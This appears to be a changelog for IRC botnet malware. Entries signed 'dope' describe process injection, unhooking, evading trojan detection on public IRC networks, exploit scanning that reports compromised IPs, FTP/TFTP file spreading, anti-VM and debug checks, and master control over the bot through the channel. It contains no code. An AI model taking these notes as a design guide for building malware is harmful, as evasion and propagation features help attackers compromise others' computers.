0.2
-------
90.		Went through all files and made some functions use the constant extern settings rather
		than getting them passed on through function headers, code looks now cleaner and file is
		0.5kb smaller :) More optmizations could be made though.. LATER! (all files). - dope
89.		Fixed bug with InternetConnectedState not working when injected. Like below, i just
		made it ignore the command if injected, only solution i could find (bot.cpp). - dope
88.		Fixed bug with bot BSOD on Win9x (WMware) when trying to connect to a local ircd.
		I just made it ignore localhost (bot.cpp). - dope
87.		Fixed bug with bots in channel running topic commands when you are logged in and
		chaned the topic (bot.cpp). - dope

		parser a bit more faster since it will compare less strings (bot.cpp/config.h). - dope
80.		Fixed problem with public ircnets detecting bot as "trojan", bling blang, now they dont!
		(ident.cpp/irc.cpp). - dope	
79.		Fixed bug with isportopen() timeout, timeout was set too low (scanner.cpp). - dope
78.		Added unhook_functions(), just a function that executes some unhook() functions.
		Made it because its used often in injection codes and makes it look less bloated
		(fwb.cpp/injection.cpp/melt.cpp/unhook.cpp/unhook.h). - dope

		gives a console with output, while Release does not. Now you _DONT_ have to mess
		with the pragma in bot.h (bot.h). - dope
72.		Made so bot rejoins channel if kicked (bot.cpp). - dope
71.		Made so master gets un-authed if he gets kicked (bot.cpp). - dope

65.		Fixed bug with scanmain(), reporting exploitation on one ip several times
		(scanner.cpp). - dope

		adding a sploit scan (bot.cpp/scanner.cpp). - dope
51.		Fixed so if an idiot, like h4x^^, enables both FTPd AND TFTPd, shell_getfile() will
		only do TFTPd, so a file dosent get downloaded twice or that FTPd dosent get used because
		TFTPd pwnz it. (misc.cpp/misc.h)
50.		Added emergency_remove(), used with debug check and wmware check code
		(install.cpp/install.h). - dope
